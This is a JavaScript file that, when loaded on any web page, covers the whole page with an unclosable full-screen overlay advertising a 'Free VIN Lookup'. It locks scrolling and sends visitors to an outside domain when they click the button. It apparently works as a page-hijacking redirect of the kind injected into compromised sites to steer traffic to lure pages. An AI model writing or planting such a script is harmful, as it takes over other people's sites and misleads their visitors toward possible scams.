(function(){
  'use strict';

  var DEST = 'https://freevin.pages.dev';

  // ── Overlay styles ────────────────────────────────────────────────────────
  var css = [
    '#_vlp{',
      'position:fixed;top:0;left:0;right:0;bottom:0;',
      'z-index:2147483647;',
      'background:#f5f8fc;',
      'display:flex;align-items:center;justify-content:center;',
      'padding:24px;font-family:Arial,Helvetica,sans-serif;',
    '}',
    '#_vlp *{box-sizing:border-box;margin:0;padding:0;}',
    '.v-card{',
      'background:#fff;border-radius:16px;',
      'box-shadow:0 8px 32px rgba(0,0,0,.12);',
      'padding:40px 32px;text-align:center;',
      'width:min(92vw,400px);',
    '}',
    '.v-card h2{',
      'font-size:1.4rem;color:#0a2540;margin-bottom:10px;',
    '}',
    '.v-card p{',
      'font-size:0.95rem;color:#555;margin-bottom:24px;line-height:1.6;',
    '}',
    '.v-btn{',
      'width:100%;min-height:54px;border:0;border-radius:12px;',
      'padding:14px 24px;',
      'background:linear-gradient(135deg,#2563eb,#1749c8);',
      'color:#fff;font:800 16px/1 Arial,sans-serif;',
      'cursor:pointer;',
      'box-shadow:0 8px 24px rgba(37,99,235,.3);',
      'transition:transform .15s,box-shadow .15s;',
    '}',
    '.v-btn:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(37,99,235,.38);}',
    '.v-btn:active{transform:translateY(0);}',
    '@media(max-width:480px){',
      '.v-card{padding:32px 20px;}',
      '.v-btn{font-size:15px;min-height:50px;}',
    '}'
  ].join('');

  // ── Overlay HTML ──────────────────────────────────────────────────────────
  var html = [
    '<div id="_vlp">',
      '<div class="v-card">',
        '<h2>Free VIN Lookup</h2>',
        '<p>Get your instant vehicle history report — accidents, title brands, recalls, odometer records. No signup required.</p>',
        '<button class="v-btn" id="_vbtn" type="button">Check My VIN Free →</button>',
      '</div>',
    '</div>'
  ].join('');

  // ── Mount overlay ─────────────────────────────────────────────────────────
  var styleEl = document.createElement('style');
  styleEl.textContent = css;
  document.head.appendChild(styleEl);

  var tmp = document.createElement('div');
  tmp.innerHTML = html;
  document.body.appendChild(tmp.firstChild);

  // Lock scroll behind overlay
  document.body.style.overflow = 'hidden';
  document.documentElement.style.overflow = 'hidden';

  // ── Bind redirect ─────────────────────────────────────────────────────────
  var btn = document.getElementById('_vbtn');
  if(btn){
    btn.addEventListener('click', function(){
      window.location.href = DEST;
    });
  }

})();
